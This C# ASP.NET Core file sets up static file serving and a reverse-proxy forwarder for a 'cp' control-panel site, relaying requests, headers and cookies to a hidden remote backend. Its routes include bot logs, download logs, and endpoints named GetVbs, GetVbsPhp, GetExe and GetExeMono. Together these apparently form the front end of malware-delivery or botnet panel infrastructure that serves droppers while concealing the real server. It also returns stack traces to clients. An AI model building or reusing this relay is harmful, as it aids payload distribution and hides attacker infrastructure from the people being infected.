using System.Net;
using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Http;
using Microsoft.Extensions.FileProviders;
using model;

namespace cp;

/// <summary>Static files and forwarder branch for the cp site (invoked under <see cref="CpSettings.SitePathPrefix"/>).</summary>
internal static class CpPipeline
{
    public static void DataServe(IApplicationBuilder app)
    {
        foreach (var rec in BackSvc.Servers)
        {
            var path = Path.Join(ServerModelLoader.RootDataStatic, rec.Key);
            app.UseStaticFiles(new StaticFileOptions
            {
                FileProvider = new PhysicalFileProvider(path),
                RequestPath = "/data"
            });
        }
    }

    public static void ForwarderMode(IApplicationBuilder app)
    {
        // IApplicationBuilder.Map(path, RequestDelegate) is not always available; branch + Run is unambiguous.
        void MapFwd(PathString p) => app.Map(p, b => b.Run(ForwardRequest));

        MapFwd("/admin");
        MapFwd("/upsert");
        MapFwd("/update");

        MapFwd("/auth");
        MapFwd("/auth/logout");

        MapFwd("/{profile}/{random}/{target}/DnLog");
        MapFwd("/{profile}/{random}/{target}/GetVbs");
        MapFwd("/{profile}/GetVbsPhp");

        MapFwd("/stats/dayly");
        MapFwd("/stats/botlog");
        MapFwd("/stats/downloadlog");
        MapFwd("/GetIcon");
        MapFwd("/GetExe");
        MapFwd("/GetExeMono");

        MapFwd("/");
    }

    private static async Task ForwardRequest(HttpContext context)
    {
        try
        {
            await ForwardRequestX(context).ConfigureAwait(false);
        }
        catch (Exception e)
        {
            await context.Response.WriteAsync(e.Message + " " + e.StackTrace).ConfigureAwait(false);
        }
    }

    private static async Task ForwardRequestX(HttpContext context)
    {
        var server = BackSvc.EvalServer(context.Request);
        using var handler = new HttpClientHandler
        {
            AllowAutoRedirect = false
        };
        using var client = new HttpClient(handler);

        var path = context.Request.Path.ToString();
        var targetUrl = $"{CpSettings.RemoteUrl}{path}{context.Request.QueryString}";

        Uri.TryCreate(targetUrl, UriKind.Absolute, out var uri);
        if (uri == null)
            throw new InvalidOperationException($"Invalid request URI: {targetUrl}");

        var requestMessage = new HttpRequestMessage
        {
            Method = new HttpMethod(context.Request.Method),
            RequestUri = uri
        };

        foreach (var header in context.Request.Headers)
        {
            if (!requestMessage.Headers.TryAddWithoutValidation(header.Key, (IEnumerable<string>)header.Value))
            {
                if (context.Request.ContentLength > 0)
                {
                    requestMessage.Content ??= new StreamContent(context.Request.Body);
                    requestMessage.Content.Headers.TryAddWithoutValidation(header.Key,
                        (IEnumerable<string>)header.Value);
                }
            }
        }

        if (context.Request.Cookies.Count > 0)
        {
            var cookieHeader = string.Join("; ",
                context.Request.Cookies.Select(cookie => $"{cookie.Key}={cookie.Value}"));
            requestMessage.Headers.Add("Cookie", cookieHeader);
        }

        requestMessage.Headers.Add("HTTP_X_FORWARDED_FOR", context.Connection.RemoteIpAddress?.ToString() ?? "");
        requestMessage.Headers.Add("HTTP_X_SERVER", server);

        var responseMessage = await HandleRedirect(handler, client, requestMessage).ConfigureAwait(false);

        context.Response.StatusCode = (int)responseMessage.StatusCode;

        foreach (var header in responseMessage.Headers)
            context.Response.Headers[header.Key] = header.Value.ToArray();

        foreach (var header in responseMessage.Content.Headers)
            context.Response.Headers[header.Key] = header.Value.ToArray();

        if (responseMessage.Headers.Contains("Set-Cookie"))
        {
            var cookies = responseMessage.Headers.GetValues("Set-Cookie");
            foreach (var cookie in cookies)
                context.Response.Headers.Append("Set-Cookie", cookie);
        }

        context.Response.Headers.Remove("transfer-encoding");

        await responseMessage.Content.CopyToAsync(context.Response.Body).ConfigureAwait(false);
    }

    private static async Task<HttpResponseMessage> HandleRedirect(HttpClientHandler handler, HttpClient client,
        HttpRequestMessage requestMessage)
    {
        HttpResponseMessage responseMessage;
        var cookieCollection = new List<string>();

        do
        {
            responseMessage = await client.SendAsync(requestMessage).ConfigureAwait(false);

            if (handler.AllowAutoRedirect)
                return responseMessage;

            if ((int)responseMessage.StatusCode >= 300 && (int)responseMessage.StatusCode < 400)
            {
                var location = responseMessage.Headers.Location;
                if (location == null)
                    break;

                if (responseMessage.Headers.Contains("Set-Cookie"))
                {
                    var cookies = responseMessage.Headers.GetValues("Set-Cookie");
                    foreach (var cookie in cookies)
                    {
                        var cookieValue = cookie.Split(';')[0];
                        if (!cookieCollection.Contains(cookieValue))
                            cookieCollection.Add(cookieValue);
                    }
                }

                var combinedCookies = string.Join("; ", cookieCollection);
                requestMessage.Headers.Remove("Cookie");
                if (!string.IsNullOrEmpty(combinedCookies))
                    requestMessage.Headers.Add("Cookie", combinedCookies);

                requestMessage = new HttpRequestMessage
                {
                    Method = HttpMethod.Get,
                    RequestUri = location
                };

                var pq = "/";
                try
                {
                    pq = location.PathAndQuery;
                }
                catch
                {
                    pq = "/";
                }

                requestMessage.RequestUri = new Uri(CpSettings.RemoteUrl + pq);
            }
            else
            {
                break;
            }
        } while (responseMessage.StatusCode == HttpStatusCode.Redirect ||
                 responseMessage.StatusCode == HttpStatusCode.MovedPermanently);

        return responseMessage;
    }
}
